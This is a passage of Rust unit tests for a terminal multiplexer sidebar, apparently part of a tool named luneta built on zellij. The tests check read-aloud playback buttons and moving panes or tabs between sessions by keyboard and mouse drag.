                let found = buffer.content().iter().position(|cell| cell.symbol() == icon)?;
                let (x, y) = buffer.pos_of(found);
                Some(Position::new(x, y))
            };
            for (paused, toggle, other, button) in [
                (false, aloud::PAUSE, aloud::PLAY, aloud::Button::Pause),
                (true, aloud::PLAY, aloud::PAUSE, aloud::Button::GoOn),
            ] {
                let mut buffer = Buffer::empty(Rect::new(0, 0, area.right(), area.bottom()));
                sidebar.aloud(reading(paused));
                let _ = sidebar.draw(&mut buffer, area, SystemTime::UNIX_EPOCH);
                assert_eq!(at(&buffer, other), None);
                let toggle = at(&buffer, toggle).expect("the button shows");
                let stop = at(&buffer, aloud::STOP).expect("the button shows");
                assert_eq!(toggle.y, stop.y);
                let hit = |x, y| sidebar.aloud_buttons().at(Position::new(x, y)).copied();
                assert_eq!(hit(toggle.x, toggle.y), Some(button));
                assert_eq!(hit(stop.x, stop.y), Some(aloud::Button::Stop));
                assert_eq!(hit(toggle.x, toggle.y - 1), None);
                assert_eq!(hit(toggle.x - 2, toggle.y), None, "on what it says");
                assert_eq!(usize::from(stop.x), usize::from(area.right()) - 3, "at the right");
            }
            let mut buffer = Buffer::empty(area);
            sidebar.draw_collapsed(&mut buffer, area, SystemTime::UNIX_EPOCH);
            assert_eq!(sidebar.aloud_buttons(), &Spots::default());
        }
    }

    /// The sidebar collapsed has no line of what is read aloud, and what plays
    /// you can hear: a pause is all it has to say.
    #[test]
    fn a_pause_shows_on_the_sidebar_collapsed() {
        let marked = |shown| {
            let area = Rect::new(0, 0, COLLAPSED, 6);
            let mut sidebar = Sidebar::default();
            sidebar.aloud(Some(shown));
            let mut buffer = Buffer::empty(area);
            sidebar.draw_collapsed(&mut buffer, area, SystemTime::UNIX_EPOCH);
            buffer.content().iter().any(|cell| cell.symbol() == aloud::PLAY)
        };
        for paused in [false, true] {
            let (whose, text) = (aloud::Whose::Selection, String::new());
            assert_eq!(marked(aloud::Shown::Reading { whose, text, paused }), paused);
            assert_eq!(marked(aloud::Shown::Fetching { got: 0, paused }), paused);
        }
    }

    /// Two sessions to move panes between: work, the older, with a shell alone
    /// in its tab, and a tab named auth that holds a shell and an agent at its
    /// prompt; and play, with a shell alone. The sidebar has the keys, on the
    /// first pane.
    fn carrying() -> Sidebar {
        let mut sidebar = fresh();
        let auth = |pane: Pane| Pane { tab_name: "auth".to_owned(), ..pane };
        let work = vec![
            pane(1, 0, "/w/a", "fish"),
            auth(pane(2, 1, "/w/b", "fish")),
            auth(pane(3, 1, "/w/luneta/main", "claude")),
        ];
        let play = vec![pane(5, 0, "/w/p", "fish")];
        let fold = Agent {
            session_id: "0b7e1c2a-5d1f-4c8e-9a43-1f2e3d4c5b6a".to_owned(),
            status_since: None,
            ..agent("work", 3, Status::Idle, Some("fold"))
        };
        let agents = vec![fold];
        sidebar.heard(host(vec![session("work", 10, work), session("play", 20, play)], agents));
        sidebar.focus(Keys::Sidebar);
        sidebar
    }

    /// What has luneta move the pane `pane` of work, or its tab, to play,
    /// where it `lands`, the session staying, with zellij's client nowhere
    /// on it.
    fn carried_off(pane: u32, whole: Whole, lands: Lands) -> Asked {
        let play = listed("play", 20);
        let carry = Carry::new(listed("work", 10).seat(), pane, whole, play.seat(), lands, false);
        let landing = match lands {
            Lands::Beside(beside) => Landing::Beside(PanePlace { session: play, pane: beside }),
            Lands::Tab => Landing::Tab(play),
        };
        Asked::Carry { on: Machine::Local, carry: carry.unwrap(), landing, follows: Follows::Stays }
    }

    fn enter() -> KeyEvent {
        KeyEvent::from(KeyCode::Enter)
    }

    /// The rows each line shows, by the end of its text, and which are lit.
    fn ends_shown(sidebar: &mut Sidebar) -> (Vec<String>, Vec<usize>) {
        let (rows, lit) = drawn_rows(sidebar);
        let end = |row: &String| row.rsplit(' ').next().unwrap_or_default().to_owned();
        (rows.iter().map(end).collect(), lit)
    }

    /// `V` picks the highlighted pane for another session, and `J` and `K`,
    /// as `j` and `k`, take where it lands among the rows of the other
    /// sessions, no further than the first or the last: a session's row opens
    /// a tab of its own there, which shows after its panes, and a pane's row
    /// has it beside that pane, under it. What lands is lit, and so is what it
    /// lands on, softer. `Enter` has luneta move it, and the rows stay as they
    /// are until the daemon says otherwise.
    #[test]
    fn v_picks_a_pane_and_j_and_k_take_where_it_lands() {
        let mut sidebar = carrying();
        let (listed, _) = ends_shown(&mut sidebar);
        assert_eq!(listed, ["work", "w/a", "auth", "fold", "play", "w/p"]);
        type_in(&mut sidebar, "V");
        assert_eq!(ends_shown(&mut sidebar), (listed.clone(), vec![1]));
        type_in(&mut sidebar, "J");
        let tab = ["work", "auth", "fold", "play", "w/p", "w/a"];
        assert_eq!(ends_shown(&mut sidebar), (tab.map(str::to_owned).to_vec(), vec![3, 5]));
        type_in(&mut sidebar, "jJ");
        let beside = ["work", "auth", "fold", "play", "w/p", "w/a"];
        assert_eq!(ends_shown(&mut sidebar), (beside.map(str::to_owned).to_vec(), vec![4, 5]));
        type_in(&mut sidebar, "K");
        assert_eq!(ends_shown(&mut sidebar).1, [3, 5]);
        type_in(&mut sidebar, "kK");
        assert_eq!(ends_shown(&mut sidebar).1, [3, 5]);
        type_in(&mut sidebar, "J");

        let asked = sidebar.key(&enter(), moment(160_000));
        assert_eq!(asked, carried_off(1, Whole::Pane, Lands::Beside(5)));
        assert!(matches!(sidebar.moving, Moving::Still));
        assert_eq!(ends_shown(&mut sidebar).0, listed);
        assert_eq!(cursor(&sidebar), Some(pane_of("work", 10, 1)));
    }

    /// Where it lands is nowhere but another session's rows: with none below
    /// it, `J` leaves it where it is, and `Enter` there, or `Esc`, puts it
    /// back. Any other key puts it back too, and does what it does.
    #[test]
    fn a_pane_picked_goes_back_where_it_lands_nowhere() {
        let mut sidebar = carrying();
        let rows = ends_shown(&mut sidebar).0;
        type_in(&mut sidebar, "GVJ");
        assert_eq!(ends_shown(&mut sidebar), (rows.clone(), vec![5]));
        assert_eq!(sidebar.key(&enter(), moment(160_000)), Asked::Nothing);
        assert!(matches!(sidebar.moving, Moving::Still));

        type_in(&mut sidebar, "VK");
        assert_eq!(sidebar.key(&KeyEvent::from(KeyCode::Esc), moment(160_000)), Asked::Nothing);
        assert_eq!(ends_shown(&mut sidebar), (rows.clone(), vec![5]));

        type_in(&mut sidebar, "VKu");
        assert!(matches!(sidebar.moving, Moving::Still));
        assert_eq!(ends_shown(&mut sidebar).0, rows);
        assert!(sidebar.news.is_unread(listed("play", 20).key(5)));
    }

    /// `V` again takes up the rest of the pane's tab, which goes whole, by
    /// every pane of it; and once more puts the tab back. A pane alone in its
    /// tab has no rest to take up, and goes back.
    #[test]
    fn v_again_takes_up_the_pane_s_tab() {
        let mut sidebar = carrying();
        type_in(&mut sidebar, "jVV");
        assert_eq!(ends_shown(&mut sidebar).1, [2, 3]);
        type_in(&mut sidebar, "J");
        let (rows, lit) = ends_shown(&mut sidebar);
        assert_eq!(rows, ["work", "w/a", "play", "w/p", "auth", "fold"]);
        assert_eq!(lit, [2, 4, 5]);
        assert_eq!(sidebar.key(&enter(), moment(160_000)), carried_off(2, Whole::Tab, Lands::Tab));

        type_in(&mut sidebar, "VVV");
        assert!(matches!(sidebar.moving, Moving::Still));
        type_in(&mut sidebar, "ggVV");
        assert!(matches!(sidebar.moving, Moving::Still));
    }

    /// What would be cut short, as what runs in a pane, or in a pane of its
    /// tab, picks nothing, and a note says why.
    #[test]
    fn what_would_be_cut_short_is_not_picked() {
        let mut sidebar = carrying();
        let mut host = sidebar.host.clone().unwrap();
        host.agents[0].status = Some(Reported::KnownStatus(Status::Busy.into()));
        sidebar.heard(host);
        type_in(&mut sidebar, "jjV");
        assert!(matches!(sidebar.moving, Moving::Still));
        assert_eq!(sidebar.notice.as_deref(), Some("not moved: its agent is at work"));
        type_in(&mut sidebar, "kV");
        assert!(matches!(sidebar.moving, Moving::Carrying(..)));
        type_in(&mut sidebar, "V");
        assert!(matches!(sidebar.moving, Moving::Carrying(_, None)), "{:?}", sidebar.moving);
        let why = "not moved: pane 3 of its tab: its agent is at work";
        assert_eq!(sidebar.notice.as_deref(), Some(why));
    }

    /// Moving the last pane of a session ends it, so the move asks first, and
    /// says so: `y` moves it, letting the session end, and any other key puts
    /// it back, doing nothing else.
    #[test]
    fn moving_a_session_s_last_pane_asks_first() {
        let mut sidebar = carrying();
        type_in(&mut sidebar, "GVK");
        assert_eq!(sidebar.key(&enter(), moment(160_000)), Asked::Nothing);
        assert!(matches!(sidebar.moving, Moving::Asking(..)));
        let notes = screen(&mut sidebar, true, 120, 30).join("\n");
        let asks = "Moving this pane to work ends play, as it is all play has: y moves it";
        assert!(notes.contains(asks), "{notes}");
        assert_eq!(sidebar.key(&char('n'), moment(160_000)), Asked::Nothing);
        assert!(matches!(sidebar.moving, Moving::Still));
        assert!(sidebar.menu.is_none());

        type_in(&mut sidebar, "VK");
        sidebar.key(&enter(), moment(160_000));
        let work = listed("work", 10);
        let (from, beside) = (listed("play", 20).seat(), Lands::Beside(3));
        let carry = Carry::new(from, 5, Whole::Pane, work.seat(), beside, true).unwrap();
        let landing = Landing::Beside(PanePlace { session: work, pane: 3 });
        let asked = Asked::Carry { on: Machine::Local, carry, landing, follows: Follows::Stays };
        assert_eq!(sidebar.key(&char('y'), moment(160_000)), asked);
    }

    /// zellij's client on the pane that moves goes with it: there first, where
    /// the session it leaves ends with the move, or the one it goes to has no
    /// client to make room for a tab, and then to where it opened. Once it
    /// opened, the highlight goes to its row as that shows. A move that
    /// opened some says what did not open, and one that closed nothing why.
    #[test]
    fn zellij_s_client_goes_with_the_pane_it_is_on() {
        let mut sidebar = carrying();
        let look = sidebar.titled("play | fish".to_owned()).expect("a look");
        let clients = vec![Client { id: 1, pane: Some(5) }];
        sidebar.looked(Looked { number: look.number, went: None, clients, before: None });
        sidebar.focus(Keys::Zellij);
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "VK");
        sidebar.key(&enter(), moment(160_000));
        let Asked::Carry { follows, landing, .. } = sidebar.key(&char('y'), moment(160_000)) else {
            panic!("no move");
        };
        assert_eq!((follows, landing.place()), (Follows::First(5), pane_of("work", 10, 3)));

        let work = listed("work", 10);
        let opened = sidebar.carried(Machine::Local, &work, Some(5), Ok(Moved::All(vec![(5, 7)])));
        assert_eq!(opened, go_here(pane_of("work", 10, 7)));
        let unfollowed = sidebar.carried(Machine::Local, &work, None, Ok(Moved::All(vec![(5, 8)])));
        assert_eq!(unfollowed, Asked::Nothing);
        let mut host = sidebar.host.clone().unwrap();
        host.sessions[0].panes.as_mut().unwrap().panes.push(pane(8, 2, "/w/p", "fish"));
        sidebar.heard(host);
        assert_eq!(cursor(&sidebar), Some(pane_of("work", 10, 8)));

        let why = "closed the tab of pane 5 of play, but zellij opened 1 of 2 again in work";
        let stranded = Moved::Stranded { opened: vec![(5, 7)], why: why.to_owned() };
        let opened = sidebar.carried(Machine::Local, &work, Some(5), Ok(stranded));
        assert_eq!(opened, go_here(pane_of("work", 10, 7)));
        assert_eq!(sidebar.notice, Some(format!("move: {why}")));

        let failed = Err("its agent, 4003, ended".to_owned());
        assert_eq!(sidebar.carried(Machine::Local, &work, Some(5), failed), Asked::Nothing);
        assert_eq!(sidebar.notice.as_deref(), Some("move: its agent, 4003, ended"));
    }

    /// A press on a pane's row lifts it once the mouse goes straight off its
    /// line, and takes the focus, and one on the bracket of its tab lifts the
    /// tab: what it lifted shows under the row of another session the pointer
    /// is on, lit, and lands there as it lets go. On its own session, or off
    /// the sidebar, it goes back. Along its line first, it sweeps the text.
    #[test]
    fn a_pane_dragged_lands_beside_the_row_it_is_let_go_on() {
        let mut sidebar = carrying();
        let area = Rect::new(0, 0, 32, 27);
        let (listed, _) = ends_shown(&mut sidebar);
        let left = MouseButton::Left;
        let from = sessions_from(&screen(&mut sidebar, true, 32, 27));
        let line = |row: usize| u16::try_from(from + row).unwrap();
        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, line(1)), area);
        let dragged = sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, line(5)), area);
        assert_eq!(dragged, Asked::Take);
        let beside = ["work", "auth", "fold", "play", "w/p", "w/a"];
        assert_eq!(ends_shown(&mut sidebar), (beside.map(str::to_owned).to_vec(), vec![4, 5]));
        let up = sidebar.mouse(mouse(MouseEventKind::Up(left), 10, line(5)), area);
        assert_eq!(up, carried_off(1, Whole::Pane, Lands::Beside(5)));

        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, line(1)), area);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, line(2)), area);
        assert_eq!(ends_shown(&mut sidebar).0, listed);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 40, line(5)), area);
        assert_eq!(ends_shown(&mut sidebar).0, listed);
        let up = sidebar.mouse(mouse(MouseEventKind::Up(left), 40, line(5)), area);
        assert_eq!(up, Asked::Nothing);

        sidebar.mouse(mouse(MouseEventKind::Down(left), 1, line(3)), area);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 1, line(4)), area);
        let (rows, lit) = ends_shown(&mut sidebar);
        assert_eq!(rows, ["work", "w/a", "play", "w/p", "auth", "fold"]);
        assert_eq!(lit, [2, 4, 5]);
        let up = sidebar.mouse(mouse(MouseEventKind::Up(left), 1, line(4)), area);
        assert_eq!(up, carried_off(3, Whole::Tab, Lands::Tab));

        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, line(1)), area);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 13, line(1)), area);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 13, line(5)), area);
        let up = sidebar.mouse(mouse(MouseEventKind::Up(left), 13, line(5)), area);
        assert!(matches!(up, Asked::CopyText(_)), "{up:?}");
    }
}
